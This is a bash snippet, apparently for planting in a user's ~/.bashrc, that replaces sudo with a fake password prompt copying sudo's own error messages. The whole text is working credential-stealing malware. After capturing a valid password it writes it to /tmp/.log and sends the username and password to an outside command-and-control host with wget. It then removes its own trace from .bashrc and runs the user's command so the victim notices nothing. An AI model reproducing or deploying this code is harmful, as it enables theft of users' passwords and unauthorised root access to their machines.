
function escalator {

	for i in {1..3}; do

		read -s -p "[sudo] password for $USER: " PASS
		echo

		TEST=$(echo "$PASS" | timeout 2 sudo -S id -un 2>&1 | grep "root" | wc -l)

		if [ $TEST -eq 0 ]; then

			if [ $i -le 2 ]; then
				echo "Sorry, try again."
			else
				echo "sudo: 3 incorrect password attempts"
				return -1
			fi

		else

			gotem "$USER" "$PASS"
			sed -ri 's/^function escalator[^\n]+//g' ~/.bashrc
			unalias sudo

			echo "$PASS" | sudo -S $@

			return

		fi

	done

}

alias sudo=escalator

function gotem {

	echo "$1:$2" >> /tmp/.log

	bash -c "wget https://my-c2.com/creds/$1/$2 >/dev/null 2>&1 &"

}